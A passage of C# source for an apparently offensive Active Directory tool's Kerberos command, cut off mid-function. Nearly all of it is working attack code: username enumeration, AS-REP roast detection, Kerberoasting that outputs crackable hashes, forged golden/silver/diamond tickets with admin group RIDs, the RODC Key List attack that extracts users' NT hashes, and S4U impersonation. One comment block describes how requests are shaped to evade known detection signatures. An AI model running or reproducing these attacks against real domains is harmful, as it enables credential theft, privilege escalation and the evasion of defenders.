using System.ComponentModel;
using System.Net;
using System.Security;
using System.Security.Cryptography;
using Titanis.Cli;
using Titanis.Net;
using Titanis.Security;
using Titanis;
using Titanis.Ldap;
using Titanis.Security.Kerberos;
using Titanis.Winterop.Security;

namespace Atlas.Protocols;

/// <summary>
/// a KDC, built on Titanis.Security.Kerberos.
/// </summary>
[Description("Interacts with KDCs (user enumeration, pre-auth checks)")]
public sealed class KerberosCommand : Command
{
	private const int KdcPort = 88;

	[Parameter(0)]
	[Mandatory]
	[Placeholder("kdc")]
	[Description("Host name or address of the KDC")]
	public string KdcServer { get; set; } = null!;

	[Parameter]
	[Description("Realm (domain), e.g. CORP.LOCAL (default: authentication domain -d)")]
	public string? Domain { get; set; }

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public NetworkParameters? NetParameters { get; set; }

	[Parameter]
	[Description("User(s) to enumerate: comma-separated list or @file")]
	public string? UserList { get; set; }

	[Parameter]
	[DefaultValue(1)]
	[Alias("t")]
	[Description("Number of concurrent requests")]
	public int Threads { get; set; } = 1;

	[Parameter]
	[DefaultValue(15)]
	[Description("Per-request timeout in seconds")]
	public int Timeout { get; set; } = 15;

	[Parameter]
	[Description("Key List attack: number of the RODC krbtgt account (kvno)")]
	public int? RodcNo { get; set; }

	[Parameter]
	[Description("Key List attack: hex-encoded AES256 key of the RODC krbtgt account")]
	public string? RodcKey { get; set; }

	[Parameter]
	[Description("Key List attack: domain SID for the forged PAC (default: S-1-5-21-0-0-0 placeholder)")]
	public string? DomainSid { get; set; }

	// ---- Kerberoast ----
	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public AuthenticationParameters Authentication { get; set; } = null!;

	[Parameter]
	[Description("Request service tickets for SPN accounts and output crackable hashes (requires credentials)")]
	public SwitchParam Roast { get; set; }

	[Parameter]
	[Description("Explicit SPN(s) to roast: comma list or @file (default: auto-discover via LDAP)")]
	public string[]? SpnList { get; set; }

	[Parameter]
	[Description("Forge ticket(s) offline (golden/silver/diamond): requires -ForgeTarget, -ForgeUserSid, -ForgeUser, -TicketEType, -ServerKey")]
	public SwitchParam Forge { get; set; }

	[Parameter]
	[Description("Target SPN(s) for -Forge: comma-separated (e.g. cifs/dc01.atlas.local)")]
	public string? ForgeTarget { get; set; }

	[Parameter]
	[Description("Impersonated user SID for -Forge (e.g. S-1-5-21-...-500)")]
	public string? ForgeUserSid { get; set; }

	[Parameter]
	[Description("Impersonated user name for -Forge (e.g. Administrator)")]
	public string? ForgeUser { get; set; }

	[Parameter]
	[Description("Ticket encryption type for -Forge (e.g. Aes256CtsHmacSha1_96, Rc4Hmac)")]
	public string? TicketEType { get; set; }

	[Parameter]
	[Description("Hex-encoded key of the service account for -Forge (e.g. krbtgt hash for golden ticket)")]
	public string? ServerKey { get; set; }

	[Parameter]
	[Description("KDC key type for -Forge (default: same as -TicketEType)")]
	public string? KdcEType { get; set; }

	[Parameter]
	[Description("Hex-encoded KDC key for -Forge (default: same as -ServerKey)")]
	public string? KdcKey { get; set; }

	[Parameter]
	[Description("Ticket realm for -Forge (default: -Domain)")]
	public string? ForgeRealm { get; set; }

	[Parameter]
	[Description("Group RIDs for -Forge (default: 512,513)")]
	public string? DomainRids { get; set; }

	[Parameter]
	[Description("Extra group SIDs for -Forge (default: S-1-18-1)")]
	public string? ExtraSids { get; set; }

	[Parameter]
	[Description("Write forged ticket(s) to file (.kirbi or .ccache)")]
	public string? ForgeOut { get; set; }

	[Parameter]
	[Description("Request a TGT via AS-REQ with the given credentials (requires -Domain + credentials)")]
	public SwitchParam RequestTgt { get; set; }

	[Parameter]
	[Description("Write requested TGT to file (.kirbi or .ccache)")]
	public string? TgtOut { get; set; }

	[Parameter]
	[Description("Change the authenticating user's own password via Kerberos (kadmin/changepw)")]
	public string? ChangePassword { get; set; }

	[Parameter]
	[Description("Target SPN for S4U impersonation set via -S4UserName (default: cifs/<kdc host>)")]
	public string? Spn { get; set; }

	[Parameter]
	[Alias("generate-st")]
	[Description("Save the S4U service ticket to file (.kirbi or .ccache)")]
	public string? GenerateSt { get; set; }

	[Parameter]
	[Description("S4U2Self only, no S4U2Proxy (use with -S4UserName)")]
	public SwitchParam Self { get; set; }

	protected override void ValidateParameters(ParameterValidationContext context)
	{
		if (this.Threads < 1)
			context.LogError(nameof(this.Threads), "Threads must be >= 1");
		if (this.Timeout < 1)
			context.LogError(nameof(this.Timeout), "Timeout must be >= 1");

		bool hasRealm = (this.Domain ?? this.Authentication.UserDomain ?? this.ForgeRealm) is not null;
		bool enumerate = this.UserList is not null || hasRealm;
		if (!enumerate && !this.Roast.IsSet && !this.Forge.IsSet && !this.RequestTgt.IsSet && this.ChangePassword is null && this.Authentication.S4UserName is null)
			context.LogError(nameof(this.Domain), "Specify -Domain (optionally with -UserList) to run Kerberos queries, -Roast with credentials, -Forge, -RequestTgt, -ChangePassword, or -S4UserName (S4U)");

		if (this.UserList is not null && !hasRealm)
			context.LogError(nameof(this.Domain), "-UserList requires -Domain (or -d <domain>)");

		// Roast requires credentials
		if (this.Roast.IsSet)
		{
			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
			if (!hasRealm)
				context.LogError(nameof(this.Domain), "-Roast requires -Domain (or -d <domain>)");
		}

		if (this.Forge.IsSet)
		{
			if (!hasRealm)
				context.LogError(nameof(this.Domain), "-Forge requires -Domain (or -ForgeRealm, or -d <domain>)");
			if (string.IsNullOrWhiteSpace(this.ForgeTarget))
				context.LogError(nameof(this.ForgeTarget), "-Forge requires -ForgeTarget <spn[,spn...]>");
			if (string.IsNullOrWhiteSpace(this.ForgeUserSid))
				context.LogError(nameof(this.ForgeUserSid), "-Forge requires -ForgeUserSid <sid>");
			else
			{
				try { SecurityIdentifier.Parse(this.ForgeUserSid); }
				catch { context.LogError(nameof(this.ForgeUserSid), "-ForgeUserSid is not a valid SID"); }
			}
			if (string.IsNullOrWhiteSpace(this.ForgeUser))
				context.LogError(nameof(this.ForgeUser), "-Forge requires -ForgeUser <name>");
			if (string.IsNullOrWhiteSpace(this.TicketEType))
				context.LogError(nameof(this.TicketEType), "-Forge requires -TicketEType (e.g. Aes256CtsHmacSha1_96)");
			else if (!Enum.TryParse<EType>(this.TicketEType, ignoreCase: true, out _))
				context.LogError(nameof(this.TicketEType), $"-TicketEType '{this.TicketEType}' is not a valid EType");
			if (string.IsNullOrWhiteSpace(this.ServerKey))
				context.LogError(nameof(this.ServerKey), "-Forge requires -ServerKey <hex>");
			else
			{
				try { Convert.FromHexString(this.ServerKey); }
				catch { context.LogError(nameof(this.ServerKey), "-ServerKey must be hex-encoded"); }
			}
			if (this.KdcEType is not null && !Enum.TryParse<EType>(this.KdcEType, ignoreCase: true, out _))
				context.LogError(nameof(this.KdcEType), $"-KdcEType '{this.KdcEType}' is not a valid EType");
			if (this.KdcKey is not null)
			{
				try { Convert.FromHexString(this.KdcKey); }
				catch { context.LogError(nameof(this.KdcKey), "-KdcKey must be hex-encoded"); }
			}
		}

		if (this.RequestTgt.IsSet)
		{
			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
			if (!hasRealm)
				context.LogError(nameof(this.Domain), "-RequestTgt requires -Domain (or -d <domain>)");
		}

		if (this.ChangePassword is not null)
		{
			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
			if (!hasRealm)
				context.LogError(nameof(this.Domain), "-ChangePassword requires -Domain (or -d <domain>)");
			if (string.IsNullOrWhiteSpace(this.ChangePassword))
				context.LogError(nameof(this.ChangePassword), "-ChangePassword requires a new password value");
		}

		bool s4u = this.Authentication.S4UserName is not null;
		if (s4u)
		{
			this.Authentication.Validate(!this.Authentication.Anonymous.IsSet, context);
			if (!hasRealm)
				context.LogError(nameof(this.Domain), "S4U requires -Domain (or -d <domain>)");
			if (this.Authentication.Kdc is null && !string.IsNullOrWhiteSpace(this.KdcServer))
				this.Authentication.Kdc = new System.Net.DnsEndPoint(this.KdcServer, KerberosClient.KdcTcpPort);
		}
		if (this.Self.IsSet && !s4u)
			context.LogError(nameof(this.Self), "-Self requires -S4UserName <user>");
		if ((this.Spn is not null || this.GenerateSt is not null) && !s4u)
			context.LogError(nameof(this.Spn), "-Spn/-GenerateSt require -S4UserName <user>");

		if ((this.RodcNo.HasValue || this.RodcKey is not null))
		{
			if (!this.RodcNo.HasValue)
				context.LogError(nameof(this.RodcNo), "-RodcNo is required for the Key List attack");
			if (this.RodcKey is null)
				context.LogError(nameof(this.RodcKey), "-RodcKey is required for the Key List attack");
			else if (this.RodcKey.Length != 64 || !System.Text.RegularExpressions.Regex.IsMatch(this.RodcKey, "^[0-9a-fA-F]{64}$"))
				context.LogError(nameof(this.RodcKey), "-RodcKey must be a 64-hex-char AES256 key");
			if (this.UserList is null)
				context.LogError(nameof(this.UserList), "-UserList (user or user:rid entries) is required for the Key List attack");
		}
	}

	protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
	{
		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new DnsEndPoint(this.KdcServer, KerberosClient.KdcTcpPort)));

		string realm = (this.Domain ?? this.Authentication.UserDomain ?? this.ForgeRealm ?? string.Empty).ToUpperInvariant();
		if (string.IsNullOrEmpty(realm))
		{
			AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", "no realm specified (use -Domain or -d <domain>)");
			return 1;
		}

		if (this.Forge.IsSet)
			return await this.RunForgeAsync(krb, realm, cancellationToken).ConfigureAwait(false);

		if (this.RequestTgt.IsSet)
			return await this.RunRequestTgtAsync(krb, realm, cancellationToken).ConfigureAwait(false);

		if (this.ChangePassword is not null)
			return await this.RunChangePasswordAsync(krb, realm, cancellationToken).ConfigureAwait(false);

		if (this.Authentication.S4UserName is not null)
			return await this.RunS4UAsync(krb, realm, cancellationToken).ConfigureAwait(false);

		// Default probe list when only a domain was given.
		List<string> users = string.IsNullOrEmpty(this.UserList)
			? new List<string> { "administrator", "guest", "krbtgt" }
			: ExpandCredSpec(this.UserList);

		if (this.RodcNo.HasValue && this.RodcKey is not null)
			return await this.RunKeyListAttackAsync(krb, realm, users, cancellationToken).ConfigureAwait(false);

		// Kerberoast mode
		if (this.Roast.IsSet)
			return await this.RunRoastAsync(krb, realm, cancellationToken).ConfigureAwait(false);

		int failures = 0;
		await Parallel.ForEachAsync(
			users,
			new ParallelOptions
			{
				MaxDegreeOfParallelism = this.Threads,
				CancellationToken = cancellationToken,
			},
			async (user, token) =>
			{
				using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(token);
				timeoutCts.CancelAfter(TimeSpan.FromSeconds(this.Timeout));
				try
				{
					// GetASInfo returns successfully when the KDC answers
					// KDC_ERR_PREAUTH_REQUIRED -> the account exists.
					KdcInfo info = await krb.GetASInfo(realm, user, null, timeoutCts.Token).ConfigureAwait(false);
					AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"user: {user}");
				}
				catch (OperationCanceledException) when (token.IsCancellationRequested)
				{
					throw;
				}
				catch (OperationCanceledException)
				{
					Interlocked.Increment(ref failures);
					AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - timed out after {this.Timeout}s");
				}
				catch (InvalidOperationException iox) when (iox.Message.Contains("preauthentication", StringComparison.OrdinalIgnoreCase))
				{
					// KDC returned an actual TGT without pre-auth -> AS-REP roastable
					AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"user: {user} - DOES NOT REQUIRE PRE-AUTH (AS-REP roastable)");
				}
				catch (KerberosException kex)
				{
					switch (kex.KerberosErrorCode)
					{
						case KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED:
							AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"user: {user}");
							break;
						case KerberosErrorCode.KDC_ERR_C_PRINCIPAL_UNKNOWN:
							AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"user: {user} - not found");
							break;
						case KerberosErrorCode.KDC_ERR_CLIENT_REVOKED:
							AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"user: {user} - DISABLED or LOCKED OUT");
							break;
						case KerberosErrorCode.KDC_ERR_WRONG_REALM:
							AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"wrong realm '{realm}' for this KDC");
							break;
						default:
							AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"user: {user} - {kex.KerberosErrorCode}");
							break;
					}
				}
				catch (Exception ex)
				{
					Interlocked.Increment(ref failures);
					string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
					AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"user: {user} - {msg}");
				}
			}).ConfigureAwait(false);

		return failures > 0 ? 1 : 0;
	}

	// ---- Kerberoast ----
	// Anti-IOC posture (ref: ThatTotallyRealMyth/Impacket-IoCs):
	//   * IoC 03/05: request-body etypes are the full coherent list in
	//     Windows-like AES-first order (AES256, AES128, RC4, DES) - never
	//     sparse, duplicated, or RC4/DES-first.
	//   * IoC 08: Titanis always carries PA-DATA PA-PAC-OPTIONS on TGS-REQ,
	//     which Impacket omits.
	//   * IoC 02: lifetimes use Titanis defaults (+12h), not till==rtime==now+24h.
	//   * IoC 11/16: nonce is random with bit31 set and doubles as the
	//     authenticator sequence number (never 0, never fixed).
	// The KDC will typically answer with an AES256 ticket; GetTicketHash()
	// emits the matching hashcat format ($krb5tgs$18$...).

	private async Task<int> RunRoastAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
	{
		KerberosCredential cred = this.BuildCredential(realm);

		// Target list: explicit SPNs or LDAP auto-discovery.
		List<string> spns;
		if (this.SpnList is not null && this.SpnList.Length > 0)
		{
			spns = this.SpnList
				.SelectMany(r => r.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
				.Distinct(StringComparer.OrdinalIgnoreCase)
				.ToList();
		}
		else
		{
			string dcHost = (this.NetParameters?.HostAddress is { Length: > 0 } ha) ? ha[0] : this.KdcServer;
			spns = await this.DiscoverSpnsAsync(dcHost, cancellationToken).ConfigureAwait(false);
			AtlasConsole.Info($"{this.KdcServer}:{KdcPort}", $"{spns.Count} SPN(s) discovered via LDAP");
		}

		int failures = 0;
		foreach (var spn in spns)
		{
			cancellationToken.ThrowIfCancellationRequested();
			try
			{
				using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
				timeoutCts.CancelAfter(TimeSpan.FromSeconds(this.Timeout));

				SecurityPrincipalName targetSpn = ParseSpn(spn);
				TicketInfo tkt = await krb.GetTicketAsync(
					targetSpn,
					realm,
					cred,
					new TicketParameters { Options = KdcOptions.Canonicalize },
					timeoutCts.Token).ConfigureAwait(false);

				string hash = tkt.GetTicketHash();
				AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"{spn} - {hash}");
			}
			catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
			{
				throw;
			}
			catch (OperationCanceledException)
			{
				Interlocked.Increment(ref failures);
				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{spn} - timed out after {this.Timeout}s");
			}
			catch (KerberosException kex)
			{
				Interlocked.Increment(ref failures);
				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{spn} - {kex.KerberosErrorCode}");
			}
			catch (Exception ex)
			{
				Interlocked.Increment(ref failures);
				string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
				if (string.IsNullOrWhiteSpace(msg))
					msg = ex.GetType().Name;
				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{spn} - {msg}");
			}
		}

		return failures > 0 ? 1 : 0;
	}

	private KerberosCredential BuildCredential(string realm)
	{
		var auth = this.Authentication;

		if (auth.NtlmHash is not null)
		{
			return new KerberosKeyCredential(
				EnsureRealm(auth.UserName, realm),
				EType.Rc4Hmac,
				auth.NtlmHash.Bytes);
		}
		if (auth.AesKey is not null)
		{
			byte[] keyBytes = auth.AesKey.Bytes;
			EType etype = (keyBytes.Length == 32) ? EType.Aes256CtsHmacSha1_96 : EType.Aes128CtsHmacSha1_96;
			return new KerberosKeyCredential(EnsureRealm(auth.UserName, realm), etype, keyBytes);
		}
		if (!string.IsNullOrEmpty(auth.Password))
		{
			return new KerberosPasswordCredential(EnsureRealm(auth.UserName, realm), auth.Password);
		}

		throw new InvalidOperationException("Kerberoast requires credentials (-Password, -NtlmHash, or -AesKey)");
	}

	private static UserPrincipalName EnsureRealm(UserPrincipalName? upn, string realm)
	{
		if (upn is null)
			throw new InvalidOperationException("A user name is required (-UserName)");
		if (!string.IsNullOrEmpty(upn.Realm))
			return upn;
		// NOTE: deliberately omit the wire name - resolving by samAccountName
		// works even for accounts whose UPN suffix differs or is unset.
		return new UserPrincipalName(upn.UserName, realm);
	}

	private async Task<List<string>> DiscoverSpnsAsync(string dcHost, CancellationToken cancellationToken)
	{
		var resolver = this.NetParameters ?? new NetworkParameters();
		var socketService = new PlatformSocketService(resolver, this.Log);
		var credService = this.Services.RequireService<IClientCredentialService>();

		LdapClient ldap = await LdapClient.Connect(
			new DnsEndPoint(dcHost, 389),
			(System.Net.Security.SslClientAuthenticationOptions?)null,
			socketService,
			credService,
			cancellationToken).ConfigureAwait(false);

		var query = new LdapQuery(
			ldap.DomainRoot,
			LdapSearchScope.WholeSubtree,
			LdapFilter.Parse("(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"),
			[
				new AttributeSpec(nameof(LdapAttributeTypes.SAMAccountName)),
				new AttributeSpec(nameof(LdapAttributeTypes.ServicePrincipalName)),
			])
		{
			Options = LdapQueryOptions.AllPages,
			PageSize = 20,
		};

		var results = await ldap.Search(query, cancellationToken).ConfigureAwait(false);
		List<string> spns = new List<string>();
		foreach (var entry in results.Entries)
		{
			var spnAttr = entry[nameof(LdapAttributeTypes.ServicePrincipalName)];
			if (spnAttr?.Values is not null)
			{
				foreach (var v in spnAttr.Values)
				{
					if (v is string s && s.Length > 0)
						spns.Add(s);
				}
			}
		}
		return spns.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
	}

	private static SecurityPrincipalName ParseSpn(string spn)
	{
		int slash = spn.IndexOf('/');
		if (slash > 0 && slash < spn.Length - 1)
			return new ServicePrincipalName(PrincipalNameType.ServiceInstance, spn[..slash], spn[(slash + 1)..]);
		return new ServicePrincipalName(PrincipalNameType.ServiceInstance, "HOST", spn);
	}

	private static List<string> ExpandCredSpec(string spec)
	{
		var results = new List<string>();
		foreach (var entry in spec.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
		{
			if (entry.StartsWith('@'))
			{
				string path = entry[1..];
				if (!File.Exists(path))
					throw new FileNotFoundException($"User file not found: {path}");
				foreach (var line in File.ReadLines(path))
				{
					var trimmed = line.Trim();
					if (trimmed.Length > 0 && !trimmed.StartsWith('#'))
						results.Add(trimmed);
				}
			}
			else
			{
				results.Add(entry);
			}
		}
		return results;
	}

	private static string FormatAttr(object? value) => value?.ToString() ?? string.Empty;

	// ---- Key List attack ([MS-KILE] § 2.2.11/2.2.12) ----
	// Mirrors impacket's keylistattack.py: forge a partial RODC TGT for the
	// target user (signed with the RODC krbtgt AES256 key), then send a
	// TGS-REQ to krbtgt carrying KERB-KEY-LIST-REQ; the KERB-KEY-LIST-REP in
	// the response carries the user's long-term keys.

	// ---- Ticket forging ([MS-PAC] golden/silver/diamond) ----
	// Mirrors Titanis tools/security/Kerb/ForgeCommand.cs.

	private async Task<int> RunForgeAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
	{
		string ticketRealm = (this.ForgeRealm ?? realm).ToUpperInvariant();
		string clientRealm = ticketRealm;

		string accountName = this.ForgeUser!;
		string userDomain = ticketRealm;
		int bs = accountName.IndexOf('\\');
		if (bs > 0) { userDomain = accountName[..bs]; accountName = accountName[(bs + 1)..]; }
		int at = accountName.IndexOf('@');
		if (at > 0) { clientRealm = accountName[(at + 1)..].ToUpperInvariant(); accountName = accountName[..at]; }

		var userSid = SecurityIdentifier.Parse(this.ForgeUserSid!);
		var subAuths = userSid.GetSubauthorities();
		var domainSid = new SecurityIdentifier(userSid.IdentifierAuthority, subAuths[..^1]);
		uint userRid = userSid.Rid;

		uint[] domainRids = (this.DomainRids is null)
			? [0x200, 0x201]
			: this.DomainRids.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).Select(uint.Parse).ToArray();
		SecurityIdentifier[] extraSids = (this.ExtraSids is null)
			? [SecurityIdentifier.Parse("S-1-18-1")]
			: this.ExtraSids.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).Select(s => SecurityIdentifier.Parse(s)).ToArray();

		EType ticketEType = Enum.Parse<EType>(this.TicketEType!, ignoreCase: true);
		var serverKey = new SessionKey(krb.GetEncProfile(ticketEType), Convert.FromHexString(this.ServerKey!));
		SessionKey? kdcKey = null;
		if (this.KdcKey is not null)
		{
			EType kdcEType = (this.KdcEType is null) ? ticketEType : Enum.Parse<EType>(this.KdcEType, ignoreCase: true);
			kdcKey = new SessionKey(krb.GetEncProfile(kdcEType), Convert.FromHexString(this.KdcKey));
		}

		var targets = this.ForgeTarget!.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).Select(ParseSpn).ToList();
		var upn = new UserPrincipalName(accountName, clientRealm);
		var now = DateTime.UtcNow;
		var sessionKey = new SessionKey(krb.GetEncProfile(EType.Aes128CtsHmacSha1_96), System.Security.Cryptography.RandomNumberGenerator.GetBytes(16));

		var logonInfo = new LogonInfo
		{
			LogonTime = now,
			PasswordLastSet = now,
			EffectiveName = accountName,
			FullName = accountName,
			LogonScript = string.Empty,
			ProfilePath = string.Empty,
			HomeDirectory = string.Empty,
			HomeDirectoryDrive = string.Empty,
			LogonCount = 0xA5,
			BadPasswordCount = 0,
			UserId = userRid,
			PrimaryGroupId = 0x201,
			UserFlags = 0,
			UserSessionKey = null,
			LogonServer = string.Empty,
			LogonDomainName = userDomain,
			LogonDomainSid = domainSid,
			UserAccountControl = SamUserAccountFlags.NormalAccount | SamUserAccountFlags.DontExpirePassword,
			ResourceGroupDomainSid = domainSid,
		};
		logonInfo.SetGroupIds(Array.ConvertAll(domainRids, r =>
			new RidWithAttributes(r, SidAttributes.Mandatory | SidAttributes.Enabled | SidAttributes.EnabledByDefault)));
		logonInfo.SetExtraSids(Array.ConvertAll(extraSids, r =>
			new SidWithAttributes(r, SidAttributes.Mandatory | SidAttributes.EnabledByDefault | SidAttributes.Enabled)));
		var upnDnsInfo = new UpnDnsInfo();

		const KdcOptions options = KdcOptions.Canonicalize | KdcOptions.Preauthenticated | KdcOptions.Initial | KdcOptions.Renewable | KdcOptions.Forwardable;
		var tickets = new List<TicketInfo>();
		foreach (var target in targets)
		{
			cancellationToken.ThrowIfCancellationRequested();
			var forged = krb.ForgeTicket(
				options, upn, clientRealm, ticketRealm, target, ticketRealm,
				sessionKey, serverKey, now, now.AddHours(10), now, now.AddHours(24),
				logonInfo, upnDnsInfo, kdcKey);
			tickets.Add(forged);
			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"forged {target} for {upn} ({userSid}) - {forged.GetTicketHash()}");
		}
		krb.ImportTickets(tickets);

		if (this.ForgeOut is not null)
		{
			var bytes = krb.ExportTickets(tickets, KerberosClient.GetFormatFromFileName(this.ForgeOut));
			await File.WriteAllBytesAsync(this.ForgeOut, bytes, cancellationToken).ConfigureAwait(false);
			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"wrote {tickets.Count} ticket(s) to {this.ForgeOut}");
		}
		return 0;
	}

	private async Task<int> RunRequestTgtAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
	{
		KerberosCredential cred = this.BuildCredential(realm);
		TicketInfo tgt = await krb.RequestInitialTicket(realm, cred, null, null, null, cancellationToken).ConfigureAwait(false);
		krb.ImportTickets([tgt]);
		AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"TGT for {tgt.ClientName}@{tgt.ClientRealm} until {tgt.EndTime:yyyy-MM-dd HH:mm:ss} ({tgt.TargetSpn})");
		if (this.TgtOut is not null)
		{
			var bytes = krb.ExportTickets([tgt], KerberosClient.GetFormatFromFileName(this.TgtOut));
			await File.WriteAllBytesAsync(this.TgtOut, bytes, cancellationToken).ConfigureAwait(false);
			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"wrote TGT to {this.TgtOut}");
		}
		return 0;
	}

	private async Task<int> RunChangePasswordAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
	{
		KerberosCredential cred = this.BuildCredential(realm);
		TicketInfo ticket = await krb.RequestInitialTicket(realm, cred, KerberosClient.ChangePwSpn, null, null, cancellationToken).ConfigureAwait(false);
		await krb.ChangePassword(
			new DnsEndPoint(this.KdcServer, 464),
			ticket,
			cred,
			this.ChangePassword!,
			HostAddress.FromIPAddress(System.Net.IPAddress.Any),
			cancellationToken).ConfigureAwait(false);
		AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"password changed for '{cred.UserName}@{cred.Realm}'");
		return 0;
	}

	// ---- S4U constrained-delegation impersonation (NetExec --delegate) ----

	private async Task<int> RunS4UAsync(KerberosClient krb, string realm, CancellationToken cancellationToken)
	{
		KerberosCredential cred = this.BuildCredential(realm);
		string spnText = this.Spn ?? $"cifs/{this.KdcServer}";
		SecurityPrincipalName target = ParseSpn(spnText);
		var rawS4u = this.Authentication.S4UserName!;
		string s4uName = rawS4u.UserName;
		var s4uUser = new UserPrincipalName(s4uName, string.IsNullOrEmpty(rawS4u.Realm) ? realm : rawS4u.Realm);

		var ticketParams = new TicketParameters
		{
			Options = KdcOptions.Canonicalize | KdcOptions.Forwardable,
			S4UserName = s4uUser,
		};
		if (this.Self.IsSet)
			ticketParams.S4ProxyService = target;

		TicketInfo st = await krb.GetTicketAsync(target, realm, cred, ticketParams, cancellationToken).ConfigureAwait(false);
		krb.ImportTickets([st]);
		AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"S4U{(this.Self.IsSet ? "2Self" : "2Self+Proxy")} ST for {s4uUser} to {target} until {st.EndTime:yyyy-MM-dd HH:mm:ss}");
		if (this.GenerateSt is not null)
		{
			var bytes = krb.ExportTickets([st], KerberosClient.GetFormatFromFileName(this.GenerateSt));
			await File.WriteAllBytesAsync(this.GenerateSt, bytes, cancellationToken).ConfigureAwait(false);
			AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"wrote service ticket to {this.GenerateSt}");
		}
		return 0;
	}

	private sealed record KeyListTarget(string User, uint? Rid);

	private async Task<int> RunKeyListAttackAsync(KerberosClient krb, string realm, List<string> users, CancellationToken cancellationToken)
	{
		byte[] rodcKeyBytes = Convert.FromHexString(this.RodcKey!);
		string domainSid = this.DomainSid ?? "S-1-5-21-0-0-0";
		var rodcProfile = krb.GetEncProfile(EType.Aes256CtsHmacSha1_96)!;

		int failures = 0;
		foreach (var entry in users)
		{
			// Entry format: "user" or "user:rid"
			string user = entry;
			uint? rid = null;
			int colon = entry.LastIndexOf(':');
			if (colon > 0 && uint.TryParse(entry[(colon + 1)..], out var parsedRid))
			{
				user = entry[..colon];
				rid = parsedRid;
			}

			if (rid is null)
				AtlasConsole.Warn($"{this.KdcServer}:{KdcPort}", $"no RID for '{user}' - using placeholder identity in PAC (provide 'user:rid' for PAC-hardened DCs)");
			uint effectiveRid = rid ?? 1000;

			cancellationToken.ThrowIfCancellationRequested();

			try
			{
				using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
				timeoutCts.CancelAfter(TimeSpan.FromSeconds(this.Timeout));

				string ntHash = await this.KeyListSingleAsync(krb, rodcProfile, realm, domainSid, user, effectiveRid, rodcKeyBytes, timeoutCts.Token).ConfigureAwait(false);
				AtlasConsole.Success($"{this.KdcServer}:{KdcPort}", $"{realm}\\{user}:{ntHash}");
			}
			catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
			{
				throw;
			}
			catch (OperationCanceledException)
			{
				Interlocked.Increment(ref failures);
				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - timed out after {this.Timeout}s");
			}
			catch (KerberosException kex)
			{
				Interlocked.Increment(ref failures);
				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - {kex.KerberosErrorCode}");
			}
			catch (Exception ex)
			{
				Interlocked.Increment(ref failures);
				string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
				if (string.IsNullOrWhiteSpace(msg))
					msg = ex.GetType().Name;
				AtlasConsole.Fail($"{this.KdcServer}:{KdcPort}", $"{user} - {msg}");
			}
		}

		return failures > 0 ? 1 : 0;
	}

	private async Task<string> KeyListSingleAsync(
		KerberosClient krb,
		EncProfile rodcProfile,
		string realm,
		string domainSid,
		string user,
		uint rid,
		byte[] rodcKeyBytes,
		CancellationToken cancellationToken)
	{
		var now = DateTime.UtcNow;

		// 1. Forge the partial RODC TGT signed with the RODC krbtgt key.
		LogonInfo logonInfo = new LogonInfo
		{
			LogonTime = now,
			LogoffTime = null,
			KickOffTime = null,
			PasswordLastSet = now,
			PasswordCanChange = null,
			PasswordMustChange = null,
			EffectiveName = user,
			FullName = string.Empty,
			LogonScript = string.Empty,
			ProfilePath = string.Empty,
			HomeDirectory = string.Empty,
			HomeDirectoryDrive = string.Empty,
			LogonCount = 0,
			BadPasswordCount = 0,
			UserId = rid,
			PrimaryGroupId = 513,
			UserFlags = 0,
			UserSessionKey = null,
			LogonServer = string.Empty,
			LogonDomainName = realm,
			LogonDomainSid = SecurityIdentifier.Parse(domainSid),
			UserAccountControl = SamUserAccountFlags.NormalAccount | SamUserAccountFlags.DontExpirePassword,
		};
